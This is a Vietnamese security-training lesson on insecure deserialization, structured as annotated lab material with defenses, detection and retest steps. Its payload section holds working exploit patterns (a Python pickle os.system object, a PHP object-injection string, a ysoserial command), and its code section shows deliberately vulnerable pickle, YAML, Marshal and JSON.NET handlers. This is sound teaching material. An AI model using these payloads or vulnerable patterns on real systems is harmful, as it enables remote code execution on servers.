---
schema_version: 1
id: WEB-A08-INSECURE-DESERIALIZATION
title: "Insecure Deserialization"
slug: insecure-deserialization
level: advanced
estimated_minutes: 65
prerequisites:
  - http-fundamentals
  - authorized-security-testing
owasp:
  - A08:2025
cwe:
  - CWE-502
content_status: technical-review
payload_status: static-verified
last_verified: null
---

# Insecure Deserialization

> [!CAUTION]
> Chỉ thực hành trên hệ thống bạn sở hữu hoặc có ủy quyền rõ ràng. Dùng dữ liệu giả, fixture có thể hủy và giới hạn tài nguyên; không gửi payload đến Internet hoặc mục tiêu thật.

## 1. Mục tiêu học tập

Sau bài học, bạn có thể:

- Giải thích Insecure Deserialization bằng root cause thay vì chỉ mô tả hậu quả.
- Nhận diện trust boundary, tài sản, actor và điều kiện cần để lỗi có thể bị khai thác.
- Thực hiện kiểm thử có kiểm soát trong lab local và phân biệt expected result với false positive.
- Chọn kiểm soát gốc, triển khai bản sửa và retest bằng positive, negative và boundary case.

## 2. Kiến thức cần có

- Nắm luồng HTTP request/response và cách ứng dụng xử lý input qua các trust boundary.
- Phân biệt authentication, authorization và validation.
- Biết đọc code/configuration trong ngôn ngữ hoặc framework xuất hiện ở ví dụ.
- Có lab local cô lập, dữ liệu giả, log quan sát được và quyền kiểm thử rõ ràng.

## 3. Kiến thức nền tảng

Hãy tưởng tượng bạn muốn gửi một ngôi nhà Lego lắp ghép hoàn chỉnh cho một người bạn ở xa qua bưu điện. Việc bê nguyên cả ngôi nhà đi gửi là bất khả thi. Vì vậy, bạn quyết định tháo dỡ ngôi nhà thành từng viên gạch, xếp gọn gàng vào hộp kèm theo bản hướng dẫn lắp ráp. Quá trình tháo dỡ và đóng gói này chính là **Serialization** (Tuần tự hóa) — chuyển đổi đối tượng phức tạp trong bộ nhớ máy tính thành một chuỗi byte hoặc ký tự đơn giản để dễ lưu trữ hoặc truyền đi xa.
Khi người bạn của bạn nhận được hộp gạch, họ mở ra và lắp ráp lại ngôi nhà Lego theo đúng bản vẽ ban đầu. Quá trình khôi phục này chính là **Deserialization** (Giải tuần tự hóa).

Hầu như ngôn ngữ lập trình nào cũng có bộ công cụ tháo lắp này: Java dùng `ObjectInputStream`/`ObjectOutputStream`, Python dùng `pickle`, còn PHP thì dùng `serialize()`/`unserialize()`.

Câu chuyện trở nên nguy hiểm khi "người gửi hộp Lego" kia không phải là bạn, mà là một kẻ tấn công mưu mô. Hắn không gửi các viên gạch thông thường, mà gửi kèm một bản hướng dẫn "ma quái". Trong thế giới lập trình, các đối tượng sau khi được lắp ráp lại thường tự động kích hoạt những hành động dọn dẹp hoặc khởi tạo mặc định — gọi là **magic methods** (như `__wakeup()` của PHP, `readObject()` của Java, hay `__reduce__()` của Python). Nếu hệ thống của bạn nhắm mắt làm theo bản hướng dẫn độc hại này, nó sẽ vô tình lắp ráp nên một "quả bom" phá hủy chính hệ thống, tận dụng những khối lệnh có sẵn trong ứng dụng (gọi là **gadget chain**) để thực thi những hành động tàn phá.

Dưới đây là ví dụ serialization bình thường trong Java:

```java
// Normal Java serialization — writing an object to a file
import java.io.*;

public class UserSession implements Serializable {
    private String username;
    private String role;

    public UserSession(String username, String role) {
        this.username = username;
        this.role = role;
    }
}

// Serialize the object to a file
UserSession session = new UserSession("alice", "user");
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("session.ser"));
oos.writeObject(session);  // Converts object to byte stream
oos.close();

// Deserialize the object from a file
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("session.ser"));
UserSession restored = (UserSession) ois.readObject();  // Restores the object
ois.close();
```

## 4. Mô tả và nguyên nhân gốc

Lỗ hổng **Insecure Deserialization (Giải tuần tự hóa không an toàn)** xuất hiện khi một ứng dụng quá ngây thơ, sẵn sàng lắp ráp lại bất kỳ chiếc hộp dữ liệu nào do người dùng gửi lên mà không hề kiểm tra xem bên trong có gài bẫy hay không. Kẻ tấn công chỉ việc tráo đổi nội dung của chiếc hộp đã được tuần tự hóa bằng một chuỗi dữ liệu chứa mã độc.

Một khi chiếc hộp độc hại này được mở ra và lắp ráp, hậu quả sẽ cực kỳ khôn lường:
- **Thực thi mã từ xa (RCE)**: Kẻ tấn công có thể ra lệnh cho máy chủ chạy bất kỳ câu lệnh nào, giống như việc cướp quyền điều khiển hoàn toàn máy tính của bạn từ xa. Đây là kịch bản tồi tệ nhất và cực kỳ phổ biến đối với lỗ hổng này.
- **Leo thang đặc quyền (Privilege Escalation)**: Chỉ cần thay đổi nhẹ một thuộc tính trong chiếc hộp (ví dụ đổi vai trò từ `"user"` thành `"admin"`), kẻ tấn công bỗng dưng có được quyền tối cao của quản trị viên.
- **Tấn công từ chối dịch vụ (DoS)**: Gửi những đối tượng lồng nhau vô hạn khiến máy chủ kiệt quệ tài nguyên, sập nguồn vì quá tải.
- **Thay đổi dữ liệu (Data Tampering)**: Âm thầm sửa đổi trạng thái hoặc logic hoạt động của ứng dụng mà không ai hay biết.

> **Gate kỹ thuật:** các nguồn cần được đối chiếu trực tiếp cho từng claim trước khi đổi `content_status` sang `verified`: [S1], [S2], [S3], [S4], [S5].

## 5. Mô hình đe dọa và điều kiện khai thác

- **Tài sản:** object graph, application state và process runtime.
- **Actor, xác thực và role:** role user gửi serialized cookie/body; không có filesystem role.
- **Điều kiện khai thác:** deserializer dựng type/gadget do actor chọn trước integrity/type policy.
- **Browser, proxy, framework và phiên bản:** container Python 3.12, Java 17 và .NET legacy tách biệt, no-network; phải lưu image/package version thực tế cùng evidence.
- **Bằng chứng bắt buộc:** cùng correlation ID phải nối input, quyết định kiểm soát và tác động lên đúng tài sản; status code riêng lẻ không đủ. [S1]

## 6. Cơ chế tấn công

Đối với insecure deserialization, deserializer dựng type/gadget do actor chọn trước integrity/type policy. Positive case phải chứng minh input đến đúng sink và tạo tác động đã mô tả; negative case khi bật kiểm soát gốc phải bị chặn trước side effect. Kết luận chỉ áp dụng cho môi trường được pin ở mục 5. [S1]

## 7. Kiểm thử trong lab được ủy quyền

1. **Setup:** khởi chạy container Python 3.12, Java 17 và .NET legacy tách biệt, no-network; chỉ nạp dữ liệu tổng hợp, bật log ứng dụng/proxy/datastore và gắn correlation ID.
2. **Baseline:** gửi một input hợp lệ của use case insecure deserialization; lưu raw request/response, quyết định policy và trạng thái tài sản trước test.
3. **Input và thao tác:** dùng đúng một payload cốt lõi ở mục 8 trong context đã annotation; thay đổi một biến mỗi lần và tuân thủ request cap.
4. **Expected result:** chỉ coi vulnerable fixture là positive khi log chứng minh cơ chế “deserializer dựng type/gadget do actor chọn trước integrity/type policy”; secure fixture phải chặn trước side effect và boundary input phải fail closed.
5. **Cleanup:** xóa dữ liệu, marker và log của insecure deserialization; thu hồi session/cache liên quan, hoàn nguyên snapshot và xác nhận không còn callback/process test.
6. **Giới hạn an toàn:** chỉ chạy trên loopback/`.lab.test`; không dùng target, credential hoặc dữ liệu thật; OOB/DoS/state-changing phải có network/CPU/memory/request cap.

## 8. Payload và phạm vi áp dụng

Các block dưới đây được giữ để technical review. `static-verified` chỉ xác nhận cấu trúc/annotation đã qua gate tĩnh; nó **không** chứng minh payload hoạt động trên mọi phiên bản. Trước khi chạy phải đối chiếu `context`, điều kiện cần, encoding, expected result và risk. Payload mở rộng thuộc `cheatsheets/`; lesson chỉ giữ ví dụ cốt lõi.

**Python pickle RCE:**

<!-- payload-id: WEB-A08-INSECURE-DESERIALIZATION-001 -->
<!-- context: Python 3.12 pickle fixture inside a disposable container -->
<!-- prerequisites: no outbound network; writable /tmp; fixture destroyed after the test -->
<!-- encoding: pickle.dumps produces Python binary protocol bytes; transport uses application/octet-stream without text conversion -->
<!-- expected-result: /tmp/pickle-lab-marker contains PICKLE_LAB after deserialization -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```python
# Attacker crafts a malicious pickle payload
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        # __reduce__ is called during deserialization
        # Returns a tuple: (callable, args) — os.system will execute the command
        return (os.system, ('printf PICKLE_LAB >/tmp/pickle-lab-marker',))

# Serialize the malicious object
payload = pickle.dumps(Exploit())

# When the server deserializes this payload...
pickle.loads(payload)  # The disposable fixture writes only the local marker.
```

**PHP Object Injection:**

<!-- payload-id: WEB-A08-INSECURE-DESERIALIZATION-002 -->
<!-- context: PHP 8.3 disposable fixture with a deliberately dangerous __destruct method -->
<!-- prerequisites: no web root; /tmp/deserialization-lab is the only writable target -->
<!-- encoding: PHP serialize output is an ASCII byte string with byte lengths generated by serialize, never hand-edited -->
<!-- expected-result: /tmp/deserialization-lab/marker.txt contains PHP_DESERIALIZATION_LAB -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```php
<?php
// Vulnerable PHP class with dangerous magic method
class FileManager {
    public $logFile = '/tmp/app.log';
    public $logData = 'normal log entry';

    // __destruct is called when the object is garbage collected
    function __destruct() {
        file_put_contents($this->logFile, $this->logData);
    }
}

// The synthetic object redirects a log write to a harmless lab marker.
$malicious = 'O:11:"FileManager":2:{s:7:"logFile";s:35:"/tmp/deserialization-lab/marker.txt";s:7:"logData";s:23:"PHP_DESERIALIZATION_LAB";}';

// Vulnerable code deserializes user input directly
$obj = unserialize($malicious);  // Creates FileManager with attacker-controlled properties
// When $obj is destroyed, __destruct writes only the fixture marker.
?>
```

**Java ysoserial gadget chain** (sử dụng công cụ ysoserial):

<!-- payload-id: WEB-A08-INSECURE-DESERIALIZATION-003 -->
<!-- context: pinned ysoserial + vulnerable Commons Collections fixture in a disposable container -->
<!-- prerequisites: no outbound network; writable /tmp; endpoint bound to loopback -->
<!-- encoding: payload.ser is Java serialization binary; curl sends bytes unchanged as application/x-java-serialized-object -->
<!-- expected-result: /tmp/java-deserialization-lab-marker contains JAVA_DESERIALIZATION_LAB -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```bash
# Generate a serialized payload using Commons Collections gadget chain
java -jar ysoserial.jar CommonsCollections1 'printf JAVA_DESERIALIZATION_LAB >/tmp/java-deserialization-lab-marker' > payload.ser

# Send the payload to the vulnerable endpoint
curl -X POST http://127.0.0.1:8080/api/session \
  --data-binary @payload.ser \
  -H "Content-Type: application/x-java-serialized-object"
```

**Các Biến thể Tấn công trên Nền tảng Khác:**

1. **.NET BinaryFormatter & JSON.NET TypeNameHandling**:
   - **BinaryFormatter**: Định dạng tuần tự hóa nhị phân mặc định của .NET. Khi gọi `BinaryFormatter.Deserialize()`, chương trình sẽ tự động xây dựng lại toàn bộ sơ đồ đối tượng từ luồng dữ liệu. Kẻ tấn công có thể sử dụng các lớp hệ thống có sẵn (như `System.Data.DataSet` hoặc `System.Windows.Data.ObjectDataProvider`) làm gadget chain (tạo ra thông qua `ysoserial.net`) để thực thi mã độc.
   - **JSON.NET TypeNameHandling**: Trong thư viện Newtonsoft.Json, thuộc tính `TypeNameHandling` cho phép xác định kiểu dữ liệu của đối tượng trực tiếp trong chuỗi JSON thông qua thuộc tính `"$type"`. Nếu cấu hình này được đặt thành bất kỳ giá trị nào khác `None` (ví dụ `All` hoặc `Objects`) và xử lý JSON từ người dùng, kẻ tấn công có thể chèn các class đặc biệt như `System.Diagnostics.Process` để kích hoạt RCE khi chuỗi JSON được phân tích cú pháp.

2. **Ruby Marshal.load**:
   - Giao thức tuần tự hóa nhị phân trong Ruby sử dụng `Marshal.dump` và `Marshal.load`. Hàm `Marshal.load` giải tuần tự hóa trực tiếp dữ liệu nhị phân mà không thực hiện kiểm tra an toàn. Bằng cách định cấu hình chuỗi byte serialized giả mạo chứa các lớp được tải sẵn (ví dụ như `ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy` trong các phiên bản Rails cũ), kẻ tấn công có thể kích hoạt việc gọi hàm `system` hoặc `eval` khi Ruby cố gắng khôi phục hoặc dọn dẹp bộ nhớ của đối tượng.

3. **YAML Deserialization (unsafe yaml.load)**:
   - Các parser YAML (như `PyYAML` trong Python) cung cấp tính năng mở rộng cho phép khởi tạo đối tượng trực tiếp từ biểu diễn văn bản của YAML thông qua các tag đặc biệt.
   - Nếu ứng dụng sử dụng hàm `yaml.load()` (sử dụng Loader mặc định của PyYAML trước phiên bản 6.0) trên dữ liệu đầu vào chưa được xác thực, kẻ tấn công có thể chèn tag `!!python/object/apply:subprocess.Popen` hoặc `!!python/object/new:os.system` kèm theo các tham số lệnh để thực thi lệnh hệ thống ngay khi hàm parse YAML được gọi.

4. **ASP.NET ViewState without MAC**:
   - `ViewState` được ASP.NET sử dụng để duy trì trạng thái của các control trên giao diện web giữa các request, được serialize bằng `ObjectStateFormatter`. Để bảo vệ tính toàn vẹn, ASP.NET sử dụng mã kiểm tra MAC (Message Authentication Code) được mã hóa bằng `machineKey` cấu hình trên máy chủ.
   - Nếu ViewState MAC bị tắt bằng cách cấu hình `<pages enableViewStateMac="false" />` hoặc nếu kẻ tấn công biết được khóa bí mật `machineKey`, kẻ tấn công có thể tự do chỉnh sửa dữ liệu ViewState nhị phân, chèn payload deserialization được tạo bởi `ysoserial.net` (ví dụ sử dụng gadget chain `ActivitySurrogateSelector` hoặc `TypeConfuseDelegate`) để đạt được quyền thực thi mã từ xa trên máy chủ IIS khi tải trang.

## 9. Code dễ bị lỗi và code an toàn

### 1. Python Pickle Deserialization
```python
# === VULNERABLE: Directly deserializing user input ===
import pickle, base64
from flask import Flask, request

app = Flask(__name__)

@app.route('/load-session', methods=['POST'])
def load_session():
    data = base64.b64decode(request.cookies.get('session'))
    session = pickle.loads(data)  # DANGEROUS: arbitrary code execution possible
    return f"Welcome {session['user']}"

# === SECURE: Using JSON with signature verification ===
import json, hmac, hashlib

SECRET_KEY = b'super-secret-key-stored-in-vault'

def sign_data(data: dict) -> str:
    """Create a signed JSON payload"""
    payload = json.dumps(data, sort_keys=True)
    signature = hmac.new(SECRET_KEY, payload.encode(), hashlib.sha256).hexdigest()
    return base64.b64encode(f"{payload}|{signature}".encode()).decode()

def verify_and_load(token: str) -> dict:
    """Verify signature before loading data — no deserialization of arbitrary objects"""
    decoded = base64.b64decode(token).decode()
    payload, signature = decoded.rsplit('|', 1)
    expected = hmac.new(SECRET_KEY, payload.encode(), hashlib.sha256).hexdigest()
    if not hmac.compare_digest(signature, expected):
        raise ValueError("Invalid signature — data has been tampered with")
    return json.loads(payload)  # SAFE: JSON cannot instantiate arbitrary objects
```

### 2. PyYAML Deserialization (Python)
```python
# === VULNERABLE: Loading YAML with full class support ===
import yaml

def load_config_vuln(yaml_string):
    # Dangerous: unsafe yaml.load allows instantiation of arbitrary Python classes via tags
    return yaml.load(yaml_string, Loader=yaml.Loader)

# === SECURE: Restricting parser to standard types ===
import yaml

def load_config_secure(yaml_string):
    # Safe: safe_load parses only standard types like maps, lists, numbers, and strings
    return yaml.safe_load(yaml_string)
```

### 3. Ruby Marshal Deserialization
```ruby
# === VULNERABLE: Loading binary payload using Marshal ===
# Dangerous: Marshal.load performs no class validation, enabling gadget chain RCE
def process_data_vuln(serialized_binary)
  data = Marshal.load(serialized_binary)
  return data
end

# === SECURE: Utilizing schema-rigid JSON deserializer ===
require 'json'

# Safe: JSON parsing only produces simple primitive object types
def process_data_secure(json_string)
  data = JSON.parse(json_string)
  return data
end
```

### 4. .NET JSON.NET TypeNameHandling
```csharp
// === VULNERABLE: JSON deserialization with polymorphic type handling ===
using Newtonsoft.Json;

public class SessionLoader {
    public object DeserializeSession(string userJson) {
        var settings = new JsonSerializerSettings {
            // Dangerous: permits the execution of constructors of types specified inside the JSON string
            TypeNameHandling = TypeNameHandling.All
        };
        return JsonConvert.DeserializeObject(userJson, settings);
    }
}

// === SECURE: Explicit type binding without dynamic handling ===
using Newtonsoft.Json;

public class SafeSessionLoader {
    public UserSession DeserializeSession(string userJson) {
        // Safe: Deserializes directly into a designated schema with no polymorphism
        return JsonConvert.DeserializeObject<UserSession>(userJson);
    }
}
```

### 5. ASP.NET ViewState Configuration
```xml
<!-- === SECURE: Enforcing ViewState integrity checks in web.config === -->
<configuration>
  <system.web>
    <!-- Safe: enableViewStateMac guarantees cryptographical validation of ViewState data -->
    <pages enableViewStateMac="true" viewStateEncryptionMode="Always" />
  </system.web>
</configuration>
```

## 10. Phát hiện

- Ghi log actor/session, route hoặc operation, object/resource, kết quả policy và correlation ID; không ghi secret hoặc toàn bộ token.
- So sánh authorization/validation failure với baseline hợp lệ và cảnh báo theo chuỗi hành vi, không chỉ theo một chuỗi payload.
- Kết hợp telemetry ứng dụng, reverse proxy và datastore để xác nhận request đã tới sink và có/không có tác động.
- Scanner hoặc WAF alert chỉ là tín hiệu điều tra; không phải bằng chứng duy nhất rằng lỗ hổng tồn tại. [S1]

## 11. Phòng thủ

### Kiểm soát bắt buộc

- Dùng DTO schema đơn giản và verify integrity trước parse; không nhận native object graph.
- Áp dụng cùng kiểm soát cho mọi route, operation và đường xử lý tương đương; thất bại phải dừng trước side effect.

### Defense-in-depth

Các biện pháp dưới đây hỗ trợ giảm blast radius hoặc tăng khả năng phát hiện. Rate limit, UUID khó đoán, WAF, CSP hoặc validation chung không được dùng để thay thế kiểm soát gốc.

```java
// Java 9+ ObjectInputFilter — only allow specific classes
ObjectInputStream ois = new ObjectInputStream(inputStream);
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.dto.*;!*"  // Allow only classes in com.myapp.dto, reject everything else
);
ois.setObjectInputFilter(filter);
```

- **Tóm tắt**: Tránh Insecure Deserialization bằng cách hạn chế deserialize dữ liệu không tin cậy, sử dụng whitelist class, ký và xác thực dữ liệu trước khi xử lý.
- **Các bước chi tiết**:
  - **Không deserialization dữ liệu từ nguồn không tin cậy** — đây là biện pháp hiệu quả nhất. Sử dụng JSON hoặc các định dạng dữ liệu đơn giản thay thế.
  - **Whitelist các class được phép** — trong Java, dùng `ObjectInputFilter` (Java 9+):
  - **Ký và xác thực dữ liệu serialized** — sử dụng HMAC để đảm bảo tính toàn vẹn trước khi deserialize.
  - **Loại bỏ gadget chain** — gỡ bỏ các thư viện không cần thiết (Commons Collections, Spring Beans) khỏi classpath.
  - **Giám sát và cảnh báo** — log mọi hoạt động deserialization, cảnh báo khi phát hiện class bất thường.

## 12. Retest

- **Positive case:** luồng hợp lệ vẫn hoạt động đúng cho actor và dữ liệu được phép.
- **Negative case:** cùng input/tài nguyên nhưng actor hoặc context không được phép bị từ chối mà không rò rỉ chi tiết nhạy cảm.
- **Boundary case:** kiểm tra giá trị rỗng, cực biên, encoding khác, request lặp, trạng thái phiên hết hạn và đường dẫn/operation tương đương.
- **Telemetry:** xác nhận policy decision, application log, proxy log và datastore side effect khớp correlation ID.
- **Regression:** lưu testcase tối thiểu tái hiện lỗi cũ và testcase chứng minh bản sửa không phụ thuộc WAF/rate limit.

## 13. Sai lầm thường gặp

- Chỉ kiểm tra status code hoặc chuỗi phản hồi mà không xác nhận side effect và log.
- Dùng payload đúng cú pháp nhưng sai DBMS, browser, framework, protocol hoặc injection context.
- Coi UUID, rate limit, WAF, CSP hoặc input validation chung là bản sửa cho một kiểm soát gốc khác.
- Chỉ sửa một route trong khi cùng sink/policy được dùng ở route khác.
- Đánh dấu `verified` dù nguồn, phiên bản fixture hoặc evidence payload chưa được lưu.

## 14. Tóm tắt và checklist

- [ ] Root cause, hậu quả và kỹ thuật khai thác đã được tách riêng.
- [ ] Actor, role/authentication, trust boundary, công nghệ và phiên bản đã rõ.
- [ ] Payload có ID duy nhất, context, encoding, điều kiện, expected result, risk, validation và source.
- [ ] Code dễ lỗi/an toàn dùng cùng framework, phiên bản và use case.
- [ ] Kiểm soát bắt buộc không bị thay thế bằng defense-in-depth.
- [ ] Positive, negative, boundary case và telemetry đã qua retest.
- [ ] Claim nhạy cảm có source marker và mọi link chỉ nằm ở mục 16–17.
- [ ] Cleanup hoàn tất; không còn secret, target thật, callback Internet hoặc dữ liệu khách hàng.

## 15. Giải thích thuật ngữ

- **Serialization (Tuần tự hóa)**: Quá trình chuyển đổi cấu trúc dữ liệu hoặc đối tượng phức tạp trong bộ nhớ thành một định dạng trung gian (chuỗi byte hoặc ký tự văn bản) để lưu trữ hoặc truyền đi.
- **Deserialization (Giải tuần tự hóa)**: Quá trình ngược lại với tuần tự hóa, tái dựng lại đối tượng ban đầu trong bộ nhớ từ định dạng trung gian.
- **Magic Methods (Phương thức ma thuật)**: Các phương thức đặc biệt trong lập trình hướng đối tượng (thường bắt đầu bằng dấu gạch dưới kép như `__wakeup`) tự động được hệ thống gọi khi có sự kiện đặc biệt xảy ra, chẳng hạn như khi đối tượng được khôi phục.
- **Classpath**: Đường dẫn chứa các lớp (class) và thư viện mà ứng dụng Java có thể tìm và sử dụng trong lúc chạy.
- **Gadget Chain (Chuỗi công cụ)**: Một chuỗi các hàm/lớp có sẵn trong ứng dụng được kẻ tấn công kết hợp khéo léo để thực thi mã độc khi quá trình giải tuần tự hóa diễn ra.
- **Payload**: Đoạn mã hoặc dữ liệu độc hại được thiết kế để khai thác lỗ hổng bảo mật.
- **Remote Code Execution (RCE)**: Lỗ hổng cho phép kẻ tấn công thực thi các câu lệnh tùy ý trực tiếp trên máy chủ mục tiêu từ xa.
- **Privilege Escalation (Leo thang đặc quyền)**: Hành vi chiếm đoạt quyền hạn cao hơn quyền hạn hợp pháp ban đầu của tài khoản.
- **Denial of Service (DoS)**: Tấn công làm cạn kiệt tài nguyên hệ thống, khiến người dùng bình thường không thể truy cập dịch vụ.
- **Webshell**: Mã độc được tải lên máy chủ web, cung cấp cho kẻ tấn công giao diện quản trị từ xa để điều khiển máy chủ đó.
- **Polymorphic (Đa hình)**: Khả năng xử lý các đối tượng thuộc các kiểu dữ liệu khác nhau thông qua một giao diện chung.
- **HMAC (Hash-based Message Authentication Code)**: Mã xác thực thông điệp bằng hàm băm kết hợp khóa bí mật, giúp đảm bảo dữ liệu không bị sửa đổi trên đường truyền.

## 16. Bài liên quan và đọc thêm

- [Prototype Pollution](../prototype-pollution/) — Lỗ hổng ô nhiễm nguyên mẫu trong JavaScript, thường kết hợp với Deserialization để khai thác runtime.
- [Code Injection](../../05-injection/code-injection/) — Chèn mã độc trực tiếp vào luồng xử lý ứng dụng.
- [Remote Code Execution](../../10-exceptional-conditions/remote-code-execution/) — Thực thi mã nguồn từ xa, hậu quả nguy hiểm nhất của giải tuần tự hóa không an toàn.

## 17. Tài liệu tham khảo

- **[S1]** PortSwigger. https://portswigger.net/web-security/deserialization — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-18.
- **[S2]** OWASP. https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/ — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-18.
- **[S3]** CWE. https://cwe.mitre.org/data/definitions/502.html — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-18.
- **[S4]** ysoserial. https://github.com/frohoff/ysoserial — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-18.
- **[S5]** OWASP Top 10:2025. https://owasp.org/Top10/2025/ — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-18.
